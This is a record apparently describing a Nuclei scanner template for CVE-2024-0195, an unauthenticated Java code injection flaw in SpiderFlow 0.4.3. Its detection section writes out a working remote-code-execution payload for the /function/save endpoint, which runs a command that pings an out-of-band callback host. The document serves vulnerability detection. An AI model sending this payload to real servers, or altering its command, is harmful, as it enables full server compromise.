---
cve_id: CVE-2024-0195
template_path: nuclei-templates/http/cves/2024/CVE-2024-0195.yaml
affected_product: SpiderFlow Crawler Platform
severity: critical
authentication: none
external_callback: true
affected_versions: 0.4.3
preconditions: []
poc_classification: rce
---

## Vulnerability
SpiderFlow Crawler Platform version 0.4.3 is affected by CVE-2024-0195, a critical code injection vulnerability (CWE-94) in FunctionService.saveFunction of src/main/java/org/spiderflow/controller/FunctionController.java. Unauthenticated remote attackers can manipulate the function save endpoint to inject and execute arbitrary Java code. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). Public exploit exists. Impact includes full server compromise and access to all crawled data. Fixed in 0.5.0 or later.

## PoC / Detection
Classification: rce

The template first sends GET / and internally matches the word 'SPIDER_FLOW_VERSION' to fingerprint the application. It then sends POST /function/save (application/x-www-form-urlencoded) with id=1&name=cmd&parameter=rce&script=%7DJava.type('java.lang.Runtime').getRuntime().exec('ping+{{interactsh-url}}')%3B%7B. Exploitation success is confirmed by matching a DNS out-of-band interaction on interactsh_protocol.

## References
- https://github.com/Shelter1234/VulneraLab/blob/main/SpiderFlow/CVE-2024-0195/README.zh-cn.md
- https://vuldb.com/?id.249510
- https://nvd.nist.gov/vuln/detail/CVE-2024-0195
- https://vuldb.com/?ctiid.249510
- https://github.com/Tropinene/Yscanner
